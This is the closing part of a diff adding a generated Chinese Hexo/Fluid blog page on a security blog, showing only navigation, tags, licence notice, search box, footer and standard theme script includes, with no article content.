+                      <a class="hover-with-bg" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/OWASP/">OWASP</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/concept/">concept</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">利用 LLMNR 名称解析缺陷劫持内网指定主机会话</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/Hexo%20yilia%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88/">
+                        <span class="hidden-mobile">Hexo yilia 主题优化方案</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <span>Powered by</span> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <span>×</span> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            Pageviews: 
+            <span id="busuanzi_value_site_pv"></span>
+             times
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            Total Visitors: 
+            <span id="busuanzi_value_site_uv"></span>
+             persons
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
